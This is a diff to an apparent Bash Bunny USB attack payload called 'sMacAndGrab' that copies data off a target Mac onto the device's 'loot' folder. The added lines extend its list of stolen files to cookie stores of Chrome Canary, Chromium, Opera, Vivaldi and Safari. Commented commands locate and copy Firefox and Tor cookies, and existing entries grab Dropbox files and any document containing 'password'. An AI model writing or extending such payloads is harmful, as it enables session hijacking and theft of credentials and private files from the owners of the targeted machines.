@@ -25,6 +25,27 @@ lootdir="/Volumes/$dev_name/loot/sMacAndGrab"
 # Add files, folders, or commands that return filenames
 files_to_copy=(
 "\"~/Library/Application Support/Google/Chrome/Default/Cookies\"" # Quote paths with spaces
+"\"~/Library/Application Support/Google/Chrome Canary/Default/Cookies\"" #Grap Chrome Canary Cookies
+"\"~/Library/Application Support/Chromium/Default/Cookies\"" #Grap Chromium Cookies
+"\"~/Library/Application Support/com.operasoftware.Opera/Cookies\"" #Grab Opera Cookies
+"\"~/Library/Application Support/com.operasoftware.OperaDeveloper/Cookies\"" #Grab Opera Developers Cookies
+"\"~/Library/Application Support/Opera Neon/Default/Cookies\"" #Grab Opera Neon Cookies
+"\"~/Library/Application Support/Vivaldi/Default/Cookies\"" #Grab Vivaldi Cookies
+"\"~/Library/Cookies/Cookies.binarycookies\"" #Grab Safari Cookies
+
+# Grab Firefox and Firefox-based Cookies with a written bash command to search for the default profile name
+# Must be edited and escaped to match Bash Bunny Environment
+####################################################
+# 1. Firefox
+# path=$(find "$HOME/Library/Application Support/Firefox/Profiles/" -maxdepth 1 -type d -name '*default*' -print0)
+# file="$path/cookies.sqlite"
+# cp "$file" ~/Desktop/Cookies/FirefoxCookies.db
+####################################################
+# 2. TOR (Firefox-based)
+# path=$(find "$HOME/Library/Application Support/TorBrowser-Data/Browser" -maxdepth 1 -type d -name '*default*' -print0)
+# file="$path/cookies.sqlite"
+# cp "$file" ~/Desktop/Cookies/TORCookies.db
+
 "~/Dropbox"
 "\$(grep -lr password ~/Documents)" # Escape the subshell to have this run on TARGET
 )
@@ -42,4 +63,3 @@ QUACK ENTER
 # sync the filesystem
 sync
 LED G
-
